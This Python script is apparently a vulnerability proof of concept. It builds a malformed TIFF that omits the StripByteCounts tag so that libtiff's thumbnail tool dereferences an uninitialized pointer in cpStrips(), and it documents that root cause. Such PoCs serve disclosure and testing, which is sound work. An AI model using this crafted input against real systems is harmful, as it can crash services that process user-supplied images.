#!/usr/bin/env python3
"""
PoC generator for VULN 003: Use of Uninitialized Pointer bytecounts in cpStrips
File: libtiff/tools/thumbnail.c, function cpStrips(), lines 269-273

Root cause: tsize_t *bytecounts declared uninitialized. TIFFGetField return value
unchecked. When STRIPBYTECOUNTS tag is missing, bytecounts retains garbage stack
value. Then bytecounts[s] dereferences the garbage pointer.

Trigger: Strip-based TIFF WITHOUT STRIPBYTECOUNTS tag (0x0117).
"""
import struct
import os

output_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'vuln_003.tif')

# TIFF layout:
#   offset 0   : 8-byte little-endian header (II, 42, ifd_offset=8)
#   offset 8   : IFD  (2 + 8*12 + 4 = 102 bytes)
#   offset 110 : pixel data (32*32 = 1024 bytes)

width  = 32
height = 32
num_tags = 8
ifd_start = 8
ifd_size  = 2 + num_tags * 12 + 4   # count(2) + entries + next_ifd(4)
pixel_data_offset = ifd_start + ifd_size  # = 110

pixel_data = bytes([0x80] * (width * height))  # solid gray

def entry_short(tag, value):
    """IFD entry: type SHORT (3), count 1, value inline."""
    return struct.pack('<HHII', tag, 3, 1, value & 0xFFFFFFFF)

def entry_long(tag, value):
    """IFD entry: type LONG (4), count 1, value inline."""
    return struct.pack('<HHII', tag, 4, 1, value)

buf = bytearray()

# --- TIFF header ---
buf += struct.pack('<HHI', 0x4949, 42, 8)  # II, magic=42, IFD offset=8

# --- IFD (tags must be in ascending order) ---
buf += struct.pack('<H', num_tags)
buf += entry_short(0x0100, width)                     # ImageWidth
buf += entry_short(0x0101, height)                    # ImageLength
buf += entry_short(0x0102, 8)                         # BitsPerSample = 8
buf += entry_short(0x0103, 1)                         # Compression = NoCompression
buf += entry_short(0x0106, 1)                         # PhotometricInterpretation = BlackIsZero
buf += entry_long (0x0111, pixel_data_offset)         # StripOffsets = 110
buf += entry_short(0x0115, 1)                         # SamplesPerPixel = 1
buf += entry_short(0x0116, height)                    # RowsPerStrip = 32 (one strip)
# --- DELIBERATELY OMIT 0x0117 StripByteCounts ---
buf += struct.pack('<I', 0)  # Next IFD offset = 0

# --- Pixel data ---
buf += pixel_data

os.makedirs(os.path.dirname(output_path), exist_ok=True)
with open(output_path, 'wb') as f:
    f.write(buf)

print(f"Written: {output_path} ({len(buf)} bytes)")
print(f"  IFD offset: {ifd_start}, size: {ifd_size} bytes")
print(f"  Pixel data offset: {pixel_data_offset}")
print(f"  Tags: {num_tags} (NO StripByteCounts 0x0117 - key trigger)")
